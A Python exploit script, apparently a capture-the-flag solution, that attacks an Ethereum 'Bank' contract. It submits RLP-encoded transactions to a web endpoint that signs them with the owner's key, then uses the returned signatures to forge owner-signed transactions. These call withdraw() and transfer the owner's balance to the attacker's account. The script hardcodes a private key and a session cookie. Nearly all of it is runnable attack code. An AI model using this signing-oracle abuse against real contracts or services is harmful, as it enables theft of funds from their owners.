import binascii
import urllib
from base64 import b64encode

import requests
import rlp
from eth_account import Account
from eth_account._utils.legacy_transactions import (
    serializable_unsigned_transaction_from_dict,
)
from web3 import Web3

RESERVE_FOR_GAS = 0.05


def download_hash(data: bytes):
    session = "pm0DxWUjpdr96m3DEyeN8I72sgKVwwu5MYEaFRo_mRY.FL5JdZ2ZYXIK7pvAiuPNIl4W4t4"

    data_encoded = urllib.parse.quote(b64encode(data).decode())
    payload_url = f"https://pepecryptomix.o-r.kr/download?amount=&receiver=&fee=&code={data_encoded}"
    response = requests.get(
        payload_url,
        cookies={"session": session},
    )
    print(response.text.strip())
    return response.text.strip()[-130:]


# Setup web3 connection
rpc_url = "https://pepecryptomix.o-r.kr:31337/7f74f33b-4848-472d-ab5b-e1fdedaa4c52"
w3 = Web3(Web3.HTTPProvider(rpc_url))

# Set up account with private key
private_key = "0x61b81825ff5d9c67083555ac55a8d845a1f3c1085baa1e3f9fcf7070861696f2"
account = Account.from_key(private_key)
print(f"My address: {account.address}")

# Contract address and ABI
bank_address = "0x6eB627D28A6Cf8253fe44A34eFcc6EBC12Cd58aF"

# ABI of the Bank contract (only including the owner function)
bank_abi = [
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{"internalType": "address", "name": "", "type": "address"}],
        "stateMutability": "view",
        "type": "function",
    }
]

# Function selector for withdraw()
function_selector = Web3.keccak(text="withdraw()").hex()[:10]


# Create contract instance
bank_contract = w3.eth.contract(address=bank_address, abi=bank_abi)

# Get the owner address
owner_address = bank_contract.functions.owner().call()

print(f"Owner address: {owner_address}")


def send_ether():
    account_balance = w3.eth.get_balance(account.address)
    amount_to_leave = w3.to_wei(0.05, "ether")
    amount_to_send = account_balance - amount_to_leave

    # Prepare transaction
    transaction = {
        "to": bank_address,
        "value": amount_to_send,
        "gas": 2000000,
        "gasPrice": w3.eth.gas_price,
        "nonce": w3.eth.get_transaction_count(account.address),
    }

    # Sign the transaction
    signed_txn = account.sign_transaction(transaction)

    # Send the transaction
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)

    # Wait for the transaction to be mined
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

    print(f"Transaction successful. Transaction hash: {tx_hash.hex()}")
    print(f"Gas used: {tx_receipt['gasUsed']}")


def send_owner_transaction(unsigned_tx):
    # RLP encode the transaction
    rlp_encoded = rlp.encode(unsigned_tx)
    print(binascii.hexlify(rlp_encoded))

    # Sign the transaction hash
    signature_hex = download_hash(rlp_encoded)

    # Recover signature from hex
    r = int(signature_hex[:64], 16)
    s = int(signature_hex[64:128], 16)
    v = int(signature_hex[128:], 16)

    # Create the signed transaction
    signed_tx = {
        "nonce": unsigned_tx.nonce,
        "gasPrice": unsigned_tx.gasPrice,
        "gas": unsigned_tx.gas,
        "to": unsigned_tx.to,
        "value": unsigned_tx.value,
        "data": unsigned_tx.data,
        "v": v,
        "r": r,
        "s": s,
    }

    # Encode the signed transaction
    encoded_signed_tx = rlp.encode(
        (
            signed_tx["nonce"],
            signed_tx["gasPrice"],
            signed_tx["gas"],
            signed_tx["to"],
            signed_tx["value"],
            signed_tx["data"],
            signed_tx["v"],
            signed_tx["r"],
            signed_tx["s"],
        )
    )

    print(binascii.hexlify(encoded_signed_tx))
    tx_hash = w3.eth.send_raw_transaction(encoded_signed_tx)
    print(f"Transaction hash: {tx_hash.hex()}")


def owner_withdraw():
    # Prepare transaction data
    nonce = w3.eth.get_transaction_count(owner_address)
    gas_price = w3.eth.gas_price
    gas_limit = 100000  # Adjust as needed

    # Create transaction dictionary
    transaction = {
        "nonce": nonce,
        "gasPrice": gas_price,
        "gas": gas_limit,
        "to": bank_address,
        "value": 0,
        "data": function_selector,
    }

    # Create an unsigned transaction
    unsigned_tx = serializable_unsigned_transaction_from_dict(transaction)
    send_owner_transaction(unsigned_tx)


def owner_transfer_to_account():
    owner_balance = w3.eth.get_balance(owner_address)
    amount_to_leave = w3.to_wei(RESERVE_FOR_GAS, "ether")
    amount_to_transfer = owner_balance - amount_to_leave

    # Prepare transaction data
    nonce = w3.eth.get_transaction_count(owner_address)
    gas_price = w3.eth.gas_price
    gas_limit = 21000  # Standard gas limit for ETH transfer

    # Create transaction dictionary
    transaction = {
        "nonce": nonce,
        "gasPrice": gas_price,
        "gas": gas_limit,
        "to": account.address,  # Transfer to our account
        "value": amount_to_transfer,
    }

    # Create an unsigned transaction
    unsigned_tx = serializable_unsigned_transaction_from_dict(transaction)
    send_owner_transaction(unsigned_tx)


owner_withdraw()
owner_transfer_to_account()
send_ether()
